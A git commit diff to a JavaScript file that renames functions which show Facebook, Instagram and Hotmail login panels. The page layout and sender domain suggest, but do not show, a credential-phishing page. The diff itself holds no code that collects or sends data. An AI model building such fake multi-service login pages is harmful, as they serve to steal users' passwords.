1d90b5a138fe2d9253ddb918c524a4adb03466e8
newsbrooklyn7964 <newsbrooklyn@swiftxpresscoltd.online>
2024-07-07 13:48:24 -0700

    Update index.js

--- js/index.js
+++ js/index.js
@@ -1,4 +1,3 @@
-
 $(document).ready(function() {
   $("#igp input").on("keydown", function () {
     var u = $("#ig-uname").val();
@@ -20,19 +19,18 @@ function can() {
   document.getElementById("choose").style.display = "none";
 
 }
-function fb() {
+function facebook() {
   document.getElementById("fbp").style.display = "block";
   document.getElementById("home").style.display = "none";
   document.getElementById("choose").style.display = "none";
 
 }
-function ig() {
+function instagram() {
   document.getElementById("igp").style.display = "block";
   document.getElementById("home").style.display = "none";
   document.getElementById("choose").style.display = "none";
 }
-
-function hm() {
+function hotmail() {
   document.getElementById("hmp").style.display = "block";
   document.getElementById("home").style.display = "none";
   document.getElementById("choose").style.display = "none";
